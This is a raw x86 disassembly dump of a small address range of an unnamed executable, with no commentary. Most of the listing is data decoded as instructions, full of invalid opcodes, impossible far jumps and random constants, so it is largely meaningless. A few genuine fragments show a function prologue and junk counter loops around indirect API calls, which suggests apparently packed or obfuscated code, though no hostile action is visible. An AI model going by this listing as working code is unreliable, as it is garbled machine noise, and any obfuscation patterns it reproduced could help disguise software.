  40724d:	cmp    DWORD PTR [eax+eiz*1-0x2526db2],ebx
  407254:	ins    BYTE PTR es:[edi],dx
  407255:	adc    edi,DWORD PTR [ebp+0x35]
  407258:	ret    0x9262
  40725b:	mov    ds:0x2cb3aea9,eax
  407260:	mov    ebx,0xbcf4589d
  407265:	jb     0x407284
  407267:	sbb    esi,DWORD PTR [edi]
  407269:	mov    ch,0x13
  40726b:	mov    eax,0x530faf77
  407270:	mov    ds:0xbe6eaa58,eax
  407275:	and    eax,0xe5f975f7
  40727a:	mov    edx,0x3064c488
  40727f:	retf   0x4481
  407282:	inc    esi
  407283:	inc    ebx
  407284:	outs   dx,BYTE PTR ds:[esi]
  407285:	das    
  407286:	pop    ebx
  407287:	adc    eax,0xe761952a
  40728c:	mov    al,ds:0xe5023b0c
  407291:	shl    DWORD PTR [ecx],1
  407293:	ret    
  407294:	jnp    0x4072eb
  407296:	retf   
  407297:	push   esi
  407298:	xor    eax,0x36a38fd7
  40729d:	retf   
  40729e:	fwait
  40729f:	ret    
  4072a0:	cli    
  4072a1:	mov    WORD PTR [ebx],?
  4072a3:	add    DWORD PTR [esi-0x6b6f548b],ebp
  4072a9:	div    ebx
  4072ab:	adc    DWORD PTR [ebp-0x59],ebp
  4072ae:	push   edi
  4072af:	cmp    edi,DWORD PTR [edx-0x6477b4a1]
  4072b5:	(bad)  
  4072b6:	sbb    dh,BYTE PTR [edi]
  4072b8:	mov    ch,0xfc
  4072ba:	mov    bh,0xb
  4072bc:	arpl   WORD PTR [edi+0x58],cx
  4072bf:	jns    0x4072e9
  4072c1:	jnp    0x40733b
  4072c3:	loope  0x4072c0
  4072c5:	loope  0x407340
  4072c7:	push   es
  4072c8:	mov    edi,0x2556682e
  4072cd:	idiv   bl
  4072cf:	in     al,dx
  4072d0:	hlt    
  4072d1:	(bad)  
  4072d2:	adc    eax,0xebafcc41
  4072d7:	pop    esp
  4072d8:	xchg   edi,eax
  4072d9:	cld    
  4072da:	inc    eax
  4072db:	in     al,dx
  4072dc:	aam    0xbc
  4072de:	push   cs
  4072df:	xchg   ebp,eax
  4072e0:	push   eax
  4072e1:	jno    0x4072fb
  4072e3:	jge    0x407267
  4072e5:	or     BYTE PTR [edi+ecx*2+0x9cd267d],cl
  4072ec:	mov    al,0x65
  4072ee:	aam    0x99
  4072f0:	std    
  4072f1:	or     ebx,DWORD PTR [ecx]
  4072f3:	ds data16 loope 0x4072c9
  4072f7:	lock les ebx,FWORD PTR ds:0x718bdce
  4072fe:	push   ebx
  4072ff:	adc    dl,BYTE PTR [edi]
  407301:	and    eax,0xfd910dcb
  407306:	mov    edx,0xfeabd0a1
  40730b:	and    DWORD PTR [ecx+0x39d10836],edx
  407311:	sbb    edx,DWORD PTR [esi]
  407313:	shr    BYTE PTR [ecx-0x1a],cl
  407316:	push   ss
  407317:	add    al,BYTE PTR [ebx]
  407319:	(bad)  
  40731a:	int    0x79
  40731c:	mov    cs,WORD PTR [ebx+ebp*2-0x567c46f6]
  407323:	mov    dl,0x2c
  407325:	stos   BYTE PTR es:[edi],al
  407326:	outs   dx,BYTE PTR ds:[esi]
  407327:	scas   eax,DWORD PTR es:[edi]
  407328:	fxch   st(6)
  40732a:	adc    BYTE PTR [eax-0x69],0x40
  40732e:	mov    esp,0xe1789b1b
  407333:	add    al,0x4f
  407335:	xchg   BYTE PTR ds:0x1bf5acc0,ah
  40733b:	pop    eax
  40733c:	push   ebp
  40733d:	xlat   BYTE PTR ds:[ebx]
  40733e:	jge    0x4073b0
  407340:	add    bh,BYTE PTR [ebx-0xd]
  407343:	mov    bl,0x46
  407345:	jae    0x407350
  407347:	xchg   DWORD PTR [ebp+0xf],esp
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4337d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4338ab
  40736f:	or     DWORD PTR ds:0x4338af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407400
  407387:	jns    0x407334
  407389:	scas   al,BYTE PTR es:[edi]
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0xcb7e7e7c
  407393:	cmp    ecx,edx
  407395:	rcr    esi,cl
  407397:	inc    eax
  407398:	dec    ebp
  407399:	jnp    0x407375
  40739b:	mov    ds:0x80bc9b34,al
  4073a0:	jl     0x40734d
  4073a2:	mov    bh,bh
  4073a4:	sbb    BYTE PTR [ecx-0x19],ah
  4073a7:	inc    esp
  4073a8:	sti    
  4073a9:	push   ecx
  4073aa:	idiv   dl
  4073ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073ad:	outs   dx,DWORD PTR ds:[esi]
  4073ae:	in     al,0x61
  4073b0:	imul   ecx,DWORD PTR [edx],0xb
  4073b3:	fdiv   QWORD PTR [ebx+0x4b96239]
  4073b9:	ficom  WORD PTR ds:0xf0eac725
  4073bf:	pop    esp
  4073c0:	mov    ds:0xd37e2bb5,eax
  4073c5:	inc    ebp
  4073c6:	mov    bl,0x4
  4073c8:	pop    es
  4073c9:	mov    cl,0xa4
  4073cb:	xor    cl,BYTE PTR [edi+ebx*1]
  4073ce:	mov    edx,0xfe589916
  4073d3:	or     dl,dl
  4073d5:	xchg   edx,eax
  4073d6:	sbb    DWORD PTR [ecx],ebp
  4073d8:	push   0xfffffff0
  4073da:	inc    ebp
  4073db:	stos   BYTE PTR es:[edi],al
  4073dc:	xor    ch,dh
  4073de:	push   ebp
  4073df:	xchg   BYTE PTR [esi],ah
  4073e1:	cmp    dh,BYTE PTR [ecx]
  4073e3:	or     ah,BYTE PTR [edi]
  4073e5:	aas    
  4073e6:	repz scas eax,DWORD PTR es:[edi]
  4073e8:	sub    ebx,DWORD PTR [edx+eiz*2]
  4073eb:	xor    cl,cl
  4073ed:	or     dl,bl
  4073ef:	shl    DWORD PTR [ebx],1
  4073f1:	mov    ebx,0x7653b9c9
  4073f6:	arpl   WORD PTR [ebx],si
  4073f8:	add    BYTE PTR [esp+esi*8],ch
  4073fb:	adc    DWORD PTR [edx-0x29],ecx
  4073fe:	push   esp
  4073ff:	jg     0x40742f
  407401:	xor    BYTE PTR [edx-0x2c5389c],cl
  407407:	aam    0xc3
  407409:	pop    ebx
  40740a:	xchg   esi,eax
  40740b:	jge    0x407390
  40740d:	sub    ebx,DWORD PTR [eax]
  40740f:	or     BYTE PTR [esi-0x6552eed0],0x8c
  407416:	ret    0x2bdb
  407419:	mov    cl,BYTE PTR [esi]
  40741b:	lds    ecx,FWORD PTR [ebp-0xe]
  40741e:	pop    ebp
  40741f:	mov    ch,0xb4
  407421:	nop
  407422:	xchg   edx,eax
  407423:	int    0x75
  407425:	mov    ch,0x5b
  407427:	mov    ah,0x6f
  407429:	mov    edi,fs
  40742b:	pop    edx
  40742c:	push   ss
  40742d:	ja     0x4073ec
  40742f:	sub    eax,0x9bfecff0
  407434:	fisub  WORD PTR [esi-0x548b9227]
  40743a:	inc    ebp
  40743b:	mov    DWORD PTR [edi+0x26],edi
  40743e:	dec    esi
  40743f:	inc    BYTE PTR [ebp+0x5531f6fd]
  407445:	out    dx,al
  407446:	pop    ss
  407447:	and    eax,0x4f86b2db
  40744c:	xor    eax,0x87382ca
  407451:	jge    0x4074c6
  407453:	and    DWORD PTR [eax],edx
  407455:	ins    DWORD PTR es:[edi],dx
  407456:	cmp    eax,DWORD PTR [esi+0x648251b0]
  40745c:	int3   
  40745d:	test   DWORD PTR [ebp+0x6f4dae9a],ebx
  407463:	jbe    0x4073fc
  407465:	pop    es
  407466:	xor    DWORD PTR [ebp-0x6f],edx
  407469:	sbb    cl,bh
  40746b:	dec    ebp
  40746c:	pop    ebp
  40746d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40746e:	daa    
  40746f:	xchg   ebx,eax
  407470:	fidiv  WORD PTR [edi]
  407472:	push   ds
  407473:	arpl   WORD PTR [ebx+0x6b],bx
  407476:	imul   edx,DWORD PTR [ebp+0x1f618345],0x33
  40747d:	and    ebx,edi
  40747f:	adc    al,bl
  407481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407482:	sub    BYTE PTR [ecx+eax*2],bh
  407485:	(bad)  
  407486:	sub    al,0x88
  407488:	rcr    BYTE PTR [esi],0xde
  40748b:	jno    0x407432
  40748d:	cld    
  40748e:	(bad)  
  40748f:	push   eax
  407490:	jb     0x407480
  407492:	call   0xf6af9d9e
  407497:	mov    WORD PTR [eax+edx*1+0x63346c38],fs
  40749e:	aas    
  40749f:	lea    eax,[eax]
  4074a1:	mov    esi,0xbb4ea6f2
  4074a6:	mov    DWORD PTR [edi+esi*1-0x9abaf10],0xdceb8883
  4074b1:	xchg   ebp,eax
  4074b2:	sub    DWORD PTR [eax+ebp*1],esi
  4074b5:	gs or  eax,0xe832df82
  4074bb:	jns    0x4074f1
  4074bd:	shl    DWORD PTR [edi+ebp*2],cl
  4074c0:	jmp    0xda193e27
  4074c5:	adc    al,0xb9
  4074c7:	pop    edx
  4074c8:	pop    ss
  4074c9:	ret    0xc792
  4074cc:	xor    eax,0x53cfb739
  4074d1:	xchg   ebp,eax
  4074d2:	dec    ebp
  4074d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d4:	mov    ah,0x9a
  4074d6:	xchg   edi,eax
  4074d7:	fwait
  4074d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074d9:	adc    DWORD PTR [edx-0x6a2a380d],edi
  4074df:	xchg   edx,eax
  4074e0:	pop    es
  4074e1:	jnp    0x4074f0
  4074e3:	mov    bl,0x93
  4074e5:	fst    QWORD PTR [ebx]
  4074e7:	xor    DWORD PTR [edx+0x5f],ecx
  4074ea:	cdq    
  4074eb:	sbb    eax,0x1cf54509
  4074f0:	js     0x40749a
  4074f2:	add    edi,DWORD PTR [ecx-0x35]
  4074f5:	ins    DWORD PTR es:[edi],dx
  4074f6:	fdivr  st(6),st
  4074f8:	popf   
  4074f9:	pop    esp
  4074fa:	fdiv   DWORD PTR [ecx+0x20]
  4074fd:	push   edx
  4074fe:	push   ds
  4074ff:	and    cl,0x8a
  407502:	xchg   edx,eax
  407503:	in     eax,dx
  407504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407505:	lods   eax,DWORD PTR ds:[esi]
  407506:	mul    BYTE PTR [edi+0x69a81409]
  40750c:	in     al,0x79
  40750e:	mov    eax,edi
  407510:	xor    BYTE PTR [esi+edi*8],al
  407513:	test   DWORD PTR [esi-0x605bc828],esp
  407519:	and    BYTE PTR [eax+0x106a9a25],dl
  40751f:	in     eax,0xa3
  407521:	dec    ebp
  407522:	rcr    BYTE PTR [edx],0xe2
  407525:	push   esi
  407526:	fdivr  QWORD PTR [esi]
  407528:	repz pusha 
  40752a:	aad    0xed
  40752c:	mov    ch,0x7e
  40752e:	aas    
  40752f:	mov    ds:0x5495a619,eax
  407534:	neg    BYTE PTR [esi+0x5a02a0a7]
  40753a:	out    0xd4,eax
  40753c:	or     eax,DWORD PTR [edi-0x5288f553]
  407542:	aad    0x66
  407544:	je     0x4074e9
  407546:	jmp    0x7ed90484
  40754b:	pop    ds
  40754c:	jl     0x407587
  40754e:	pop    ebp
  40754f:	pushf  
  407550:	push   ebx
  407551:	fsub   QWORD PTR [ecx-0x7e7012a7]
  407557:	sub    BYTE PTR [edx-0x2f],bl
  40755a:	test   DWORD PTR [edx],ebp
  40755c:	in     eax,0x91
  40755e:	and    eax,0x32ca37d2
  407563:	loopne 0x407570
  407565:	and    eax,0x56c55190
  40756a:	pop    edx
  40756b:	(bad)  
  40756c:	clc    
  40756d:	sbb    BYTE PTR [eax-0x3825fab9],dh
  407573:	add    al,0x87
  407575:	pusha  
  407576:	xchg   esp,eax
  407577:	ret    
  407578:	mov    bh,0x2
  40757a:	pushf  
  40757b:	(bad)  
  40757c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757d:	push   edx
  40757e:	sub    DWORD PTR [esi+0xbd50a19],ecx
  407584:	or     al,0x63
  407586:	icebp  
  407587:	gs pop esp
  407589:	xor    eax,DWORD PTR [ebp+0x39947434]
  40758f:	mov    BYTE PTR [ebp+0xf],ch
  407592:	out    dx,al
  407593:	cmp    al,0xff
  407595:	pop    esp
  407596:	and    eax,DWORD PTR [edi]
  407598:	push   0xffffffc6
  40759a:	mov    esi,0x45c7fcc0
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x4337d3
  4075b4:	sub    DWORD PTR ds:0x43378f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43377f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4337eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43378f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43378f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43378f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43378f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43378f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	jge    0x4075df
  407657:	je     0x407663
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x667e7e7c
  407662:	xchg   ebx,eax
  407663:	add    ebx,DWORD PTR [ebx-0x701b79f2]
  407669:	push   esi
  40766a:	mov    dl,0xda
  40766c:	adc    dh,BYTE PTR [esi]
  40766e:	jg     0x40760e
  407670:	nop
  407671:	sub    DWORD PTR [ecx-0x640ff01a],ebp
  407677:	idiv   ebx
  407679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767a:	sbb    eax,DWORD PTR [ebx-0x52cc6ea0]
  407680:	aaa    
  407681:	cmp    DWORD PTR [esi+0x7a5761b9],0x7247fb56
  40768b:	sbb    al,0xf7
  40768d:	test   BYTE PTR [ecx-0x3ec7110f],al
  407693:	mov    ecx,0x78c20eeb
  407698:	test   eax,0xec6a1aa1
  40769d:	xchg   DWORD PTR [edx+ebp*8+0x54b5627],edi
  4076a4:	mov    ds:0x9724643d,eax
  4076a9:	push   es
  4076aa:	xchg   esi,eax
  4076ab:	sub    dl,bl
  4076ad:	xchg   esi,eax
  4076ae:	mov    ebp,0x2668678c
  4076b3:	call   0x5041:0x16382db3
  4076ba:	dec    ebx
  4076bb:	and    al,0xe3
  4076bd:	jg     0x407653
  4076bf:	adc    BYTE PTR [ebp-0x3],0x3b
  4076c3:	dec    edi
  4076c4:	fwait
  4076c5:	mov    ebx,0x6d10d809
  4076ca:	dec    esi
  4076cb:	sar    DWORD PTR [esi+0x5d],0xca
  4076cf:	scas   eax,DWORD PTR es:[edi]
  4076d0:	(bad)  
  4076d1:	stc    
  4076d2:	or     al,BYTE PTR [esi-0x5f07025d]
  4076d8:	es dec eax
  4076da:	addps  xmm6,XMMWORD PTR [esi-0x543dd417]
  4076e1:	jno    0x4076d8
  4076e3:	int    0x6b
  4076e5:	mov    ch,0xc1
  4076e7:	mov    ebp,0xde7b3a97
  4076ec:	dec    ecx
  4076ed:	icebp  
  4076ee:	pop    esi
  4076ef:	loop   0x40773f
  4076f1:	gs ret 
  4076f3:	les    ebp,FWORD PTR [edx-0x80]
  4076f6:	stos   DWORD PTR es:[edi],eax
  4076f7:	pop    esp
  4076f8:	pop    ds
  4076f9:	mov    edx,0xad025c26
  4076fe:	sub    eax,0x312eaabd
  407703:	mov    ebp,0xa4fec602
  407708:	mov    bl,0x4a
  40770a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40770b:	repnz sub eax,0x8577b98e
  407711:	pop    ds
  407712:	jnp    0x4076ed
  407714:	add    DWORD PTR [ebx+0x19],esi
  407717:	add    eax,0x7606286
  40771c:	and    DWORD PTR [ecx-0x5e],ecx
  40771f:	xor    DWORD PTR [ebx+0x381a9793],ecx
  407725:	cmp    BYTE PTR [ebp+0x2cc83824],bh
  40772b:	add    al,al
  40772d:	retf   0xc814
  407730:	mov    WORD PTR [ebp-0x70],?
  407733:	(bad)
  407737:	cmp    DWORD PTR [ecx],esp
  407739:	test   al,0x8a
  40773b:	adc    DWORD PTR [ebx],0x53d0ceb0
  407741:	lods   eax,DWORD PTR ds:[esi]
  407742:	push   cs
  407743:	fwait
  407744:	clc    
  407745:	ja     0x407790
  407747:	in     al,dx
  407748:	fist   WORD PTR [ecx]
  40774a:	fs and al,0xeb
  40774d:	and    ebx,DWORD PTR [esi-0x52d9aac]
  407753:	jle    0x40779b
  407755:	push   ecx
  407756:	jp     0x407750
  407758:	jno    0x407789
  40775a:	dec    ecx
  40775b:	fs mov ah,0xb9
  40775e:	jno    0x407759
  407760:	xor    DWORD PTR [ecx],ebp
  407762:	pop    ebx
  407763:	sar    ah,cl
  407765:	lods   eax,DWORD PTR ds:[esi]
  407766:	dec    eax
  407767:	out    dx,al
  407768:	xchg   ebx,eax
  407769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40776a:	mov    esp,0xd51fae86
  40776f:	inc    eax
  407770:	or     ebp,DWORD PTR fs:[esi-0x718e7bdd]
  407777:	icebp  
  407778:	icebp  
  407779:	xor    al,0xda
  40777b:	mov    ebp,0x23076
  407780:	sbb    esi,ecx
  407782:	xchg   DWORD PTR [ebx-0x5059386c],esi
  407788:	call   0x7917:0xc20f6f29
  40778f:	(bad)  
  407790:	jb     0x40772e
  407792:	sbb    al,0x68
  407794:	pop    es
  407795:	ret    0x2666
  407798:	fwait
  407799:	mov    cs,WORD PTR [ebp+eiz*4-0x34]
  40779d:	loopne 0x40777d
  40779f:	mov    al,ds:0xfc8c8a6f
  4077a4:	adc    DWORD PTR [esi+0x4d5fea89],ecx
  4077aa:	pusha  
  4077ab:	gs clc 
  4077ad:	ret    0x123a
  4077b0:	mov    ecx,0xd39f9ed8
  4077b5:	push   edi
  4077b6:	retf   0x42cc
  4077b9:	test   eax,0xe2630ff9
  4077be:	and    al,0x2
  4077c0:	out    dx,al
  4077c1:	aam    0x85
  4077c3:	jno    0x4077e5
  4077c5:	cmp    eax,0xb5f444bd
  4077ca:	mov    ds:0x50a70587,eax
  4077cf:	ror    BYTE PTR [ebp+0x1245e270],cl
  4077d5:	cs add eax,0x608ab268
  4077db:	imul   eax,edi,0x801630c4
  4077e1:	loop   0x4077fc
  4077e3:	inc    esi
  4077e4:	mov    ebp,0xfeaf5acc
  4077e9:	push   ebp
  4077ea:	nop
  4077eb:	test   ebx,ecx
  4077ed:	scas   eax,DWORD PTR es:[edi]
  4077ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ef:	pcmpeqb mm0,QWORD PTR [edx+ebp*2]
  4077f3:	fcomp  QWORD PTR [esi+ecx*2+0x1b]
  4077f7:	(bad)
  4077fa:	enter  0xe3b2,0xfb
  4077fe:	xchg   BYTE PTR [edx],ah
  407800:	cmp    esi,DWORD PTR [eax]
  407802:	inc    edx
  407803:	aam    0xdd
  407805:	dec    ebx
  407806:	fcom   QWORD PTR [edi]
  407808:	sar    DWORD PTR [edi+esi*1-0x67],1
  40780c:	and    edx,DWORD PTR [ebx-0x6158593d]
  407812:	pop    ds
  407813:	rcr    BYTE PTR [edx],0x3c
  407816:	lahf   
  407817:	dec    ebp
  407818:	rcl    DWORD PTR [edx],0x4b
  40781b:	sub    cl,BYTE PTR [edx+0x6f]
  40781e:	pop    edx
  40781f:	or     al,0x7c
  407821:	ss lahf 
  407823:	and    BYTE PTR ds:0xed62a4e7,dl
  407829:	mov    dh,0xc6
  40782b:	or     bh,ch
  40782d:	or     DWORD PTR [esi],eax
  40782f:	(bad)  
  407830:	(bad)  [eax-0x52]
  407833:	aam    0xf2
  407835:	test   eax,0xcfbbeb69
  40783a:	xchg   BYTE PTR [eax+0x65990063],ah
  407840:	mov    dl,0x61
  407842:	dec    eax
  407843:	test   eax,0x73da85a9
  407848:	outs   dx,DWORD PTR ds:[esi]
  407849:	jne    0x40782f
  40784b:	mov    ebp,0xb06e209e
  407850:	fisubr WORD PTR [ebx-0x202cc373]
  407856:	push   0xf915bfd2
  40785b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40785d:	imul   edx,DWORD PTR [ebp+0x47],0xfffffff3
  407861:	sbb    bh,BYTE PTR [eax]
  407863:	cmp    al,0x99
  407865:	inc    ebx
  407866:	xor    BYTE PTR [edx],0x93
  407869:	mov    ds:0x2b56a3dc,eax
  40786e:	into   
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43377f,0x4337e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43389b,0x12
  40788b:	cmp    DWORD PTR ds:0x43389b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43389b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43389b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43389b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43381f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43381f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43381f,esi
  4078e0:	cmp    DWORD PTR ds:0x43381f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43381f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xd6,eax
  407922:	mov    ebx,0xce24c1c0
  407927:	jle    0x4079a7
  407929:	add    eax,0x377e7e7c
  40792e:	popa   
  40792f:	jns    0x407975
  407931:	addr16 icebp 
  407933:	pop    eax
  407935:	push   ds
  407936:	dec    ecx
  407937:	sub    al,0xe0
  407939:	mov    ch,0x9a
  40793b:	popf   
  40793c:	cmp    edx,DWORD PTR [edi]
  40793e:	outs   dx,DWORD PTR ds:[esi]
  40793f:	xchg   ebx,eax
  407940:	not    BYTE PTR [esi+0x626fb6c3]
  407946:	inc    edi
  407947:	jne    0x4078d6
  407949:	(bad)  
  40794a:	adc    DWORD PTR [ebx-0x3c78a717],ebp
  407950:	mul    DWORD PTR [eax+0x41]
  407953:	push   cs
  407954:	sub    BYTE PTR [eax-0x9],ah
  407957:	adc    bl,BYTE PTR [edx-0x46]
  40795a:	ret    0xded2
  40795d:	retf   
  40795e:	mov    ebp,0xd5b9b271
  407963:	cmp    al,0x1a
  407965:	xor    eax,0xea6d5b2d
  40796a:	call   0xecb997e9
  40796f:	out    0x3a,eax
  407971:	sub    ch,BYTE PTR [edi+0x23]
  407974:	lods   al,BYTE PTR ds:[esi]
  407975:	ss out 0xee,al
  407978:	xchg   ebx,eax
  407979:	aaa    
  40797a:	retf   0x3a47
  40797d:	fadd   QWORD PTR ds:0x185595d3
  407983:	mov    BYTE PTR ds:0x2ddf371f,al
  407989:	jbe    0x40793e
  40798b:	leave  
  40798c:	cdq    
  40798d:	loope  0x4079f9
  40798f:	push   cs
  407990:	cmp    esp,DWORD PTR [eax+ecx*8]
  407993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407994:	popw   ds
  407996:	adc    ch,BYTE PTR [esi-0x79]
  407999:	fld    TBYTE PTR [edx+0x3]
  40799c:	out    0x2f,eax
  40799e:	or     ecx,ecx
  4079a0:	dec    si
  4079a2:	sub    DWORD PTR [edx+0x1e],ebx
  4079a5:	sbb    al,0xbc
  4079a7:	pop    ss
  4079a8:	inc    esi
  4079a9:	stos   BYTE PTR es:[edi],al
  4079aa:	test   al,0x1c
  4079ac:	cmp    eax,0xa41b9b99
  4079b1:	inc    ebx
  4079b2:	int3   
  4079b3:	sbb    eax,DWORD PTR ds:0xac6c54f3
  4079b9:	test   BYTE PTR [esi],al
  4079bb:	sar    BYTE PTR [ebx+eax*8-0x7d],cl
  4079bf:	loopne 0x407960
  4079c1:	outs   dx,DWORD PTR ds:[esi]
  4079c2:	push   ecx
  4079c3:	ret    0x1aa0
  4079c6:	sub    al,BYTE PTR [edi]
  4079c8:	cmp    BYTE PTR [eax+0x62f92149],dh
  4079ce:	and    eax,0x2b55c819
  4079d3:	in     eax,dx
  4079d4:	(bad)  
  4079d5:	xor    ah,cl
  4079d7:	inc    eax
  4079d8:	out    dx,al
  4079d9:	ret    0x5753
  4079dc:	push   edi
  4079dd:	into   
  4079de:	stos   BYTE PTR es:[edi],al
  4079df:	js     0x407a30
  4079e1:	mov    WORD PTR [edi+0x2f],es
  4079e4:	push   esp
  4079e5:	out    0xaf,al
  4079e7:	mov    dl,dh
  4079e9:	shl    DWORD PTR [ebx],1
  4079eb:	imul   esp,DWORD PTR [eax],0xd
  4079ee:	out    0x4f,al
  4079f0:	dec    esi
  4079f1:	xchg   edx,eax
  4079f2:	inc    esp
  4079f4:	add    eax,0x35e437e9
  4079f9:	jmp    0x3b67bded
  4079fe:	inc    esi
  4079ff:	sub    DWORD PTR [esi-0x4],ecx
  407a02:	mov    ah,0x22
  407a04:	in     al,dx
  407a05:	and    DWORD PTR [esi-0x30f461a6],esp
  407a0b:	pushf  
  407a0c:	add    bl,dh
  407a0e:	in     al,dx
  407a0f:	ret    0x142c
  407a12:	mov    dl,0x2e
  407a14:	sahf   
  407a15:	iret   
  407a16:	fsubr  QWORD PTR [ebx]
  407a18:	mov    ch,0xff
  407a1a:	push   esi
  407a1b:	push   edx
  407a1c:	add    al,0x0
  407a1e:	jmp    0x509e:0x5c521cf4
  407a25:	out    dx,eax
  407a26:	test   eax,0x7058af7e
  407a2b:	sbb    cl,BYTE PTR [esi]
  407a2d:	inc    eax
  407a2e:	dec    esp
  407a2f:	add    eax,0xb8f12322
  407a34:	cwde   
  407a35:	inc    esp
  407a36:	repz fdiv QWORD PTR [ebp+0x44]
  407a3a:	cli    
  407a3b:	out    dx,al
  407a3c:	stc    
  407a3d:	dec    edi
  407a3e:	mov    bl,0xb4
  407a40:	push   ebx
  407a41:	xchg   ebx,eax
  407a42:	mov    ds:0x26b1091d,eax
  407a47:	loope  0x407a3c
  407a49:	mov    ds:0xa3a8857e,eax
  407a4e:	jb     0x407a4e
  407a50:	jae    0x407a88
  407a52:	xor    edi,DWORD PTR [ecx+esi*4]
  407a55:	jns    0x407a74
  407a57:	fs jb  0x407ac0
  407a5a:	js     0x407a01
  407a5c:	add    esi,DWORD PTR [ecx]
  407a5e:	repz call 0x127f:0x3c666aa2
  407a66:	in     eax,dx
  407a67:	or     eax,0x8bc9889a
  407a6c:	repnz inc esp
  407a6e:	cli    
  407a6f:	mov    eax,0xc988baa7
  407a74:	jge    0x407aaf
  407a76:	shl    ah,cl
  407a78:	xor    dl,BYTE PTR [eax+ecx*2]
  407a7b:	add    cl,BYTE PTR [edi-0x80]
  407a7e:	dec    eax
  407a7f:	enter  0xc4b5,0x15
  407a83:	mov    ecx,ecx
  407a85:	mov    ebp,0x7db5a9f7
  407a8a:	mov    ebp,0x14605b49
  407a8f:	js     0x407a52
  407a91:	les    ecx,FWORD PTR [edi]
  407a93:	adc    BYTE PTR [ebx],bh
  407a95:	or     DWORD PTR [eax+0x189c343d],esp
  407a9b:	xchg   ebx,eax
  407a9c:	ficomp DWORD PTR [esi]
  407a9e:	aad    0xc5
  407aa0:	popf   
  407aa1:	adc    ebp,DWORD PTR [eax-0x3a91d6]
  407aa7:	shl    DWORD PTR [ebp-0x20],cl
  407aaa:	push   ecx
  407aab:	bound  ecx,QWORD PTR [eax+esi*4+0x240959a8]
  407ab2:	add    bh,dl
  407ab4:	es pop ebx
  407ab6:	cwde   
